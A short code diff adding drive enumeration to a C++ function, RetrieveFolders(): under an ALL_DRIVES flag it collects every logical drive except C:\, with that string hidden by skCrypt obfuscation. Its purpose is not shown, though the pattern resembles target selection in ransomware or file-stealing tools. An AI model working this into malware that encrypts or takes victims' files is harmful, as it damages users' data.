@@ -53,6 +53,24 @@ vector<string> RetrieveFolders(int argc, char* argv[]) {
             folders.push_back(folder);
 #endif
 
+#if ALL_DRIVES
+    char buffer[256];
+    DWORD len = GetLogicalDriveStringsA(sizeof(buffer) / sizeof(buffer[0]), buffer);
+
+    if (len > 0 && len <= sizeof(buffer) / sizeof(buffer[0])) {
+        char* drive = buffer;
+
+        while (*drive) {
+            ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes, totalNumberOfFreeBytes;
+            if (GetDiskFreeSpaceExA(drive, &freeBytesAvailable, &totalNumberOfBytes, &totalNumberOfFreeBytes))
+                if ((string)drive != (string)skCrypt("C:\\"))
+                    folders.push_back((string)drive);
+
+            drive += strlen(drive) + 1;
+        }
+    }
+#endif
+
     return folders;
 }
 
